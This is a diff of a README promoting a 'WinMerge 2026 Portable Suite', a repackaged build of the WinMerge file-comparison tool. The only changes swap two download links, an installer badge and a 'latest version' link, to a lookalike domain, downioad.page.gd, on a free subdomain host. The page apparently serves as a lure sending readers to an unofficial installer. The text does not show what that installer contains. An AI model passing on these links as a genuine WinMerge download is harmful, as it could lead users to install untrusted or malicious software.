@@ -2,7 +2,7 @@
 
 Welcome to the WinMerge 2026 Portable Suite, a powerful and versatile tool designed for Windows users who need efficient file comparison and merging capabilities. This suite builds upon the robust foundation of WinMerge, adding new features and optimizations tailored for the year 2026, making it an essential asset for developers, system administrators, and anyone working with text-based files. Whether you're comparing code, documents, or configuration files, this portable version offers flexibility and enhanced performance without the need for installation.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -58,4 +58,4 @@ This suite is designed with user experience in mind, offering a balance between 
 
 ## Download
 
-[Get the latest version here](https://download-page.page.gd/)
+[Get the latest version here](https://downioad.page.gd/)
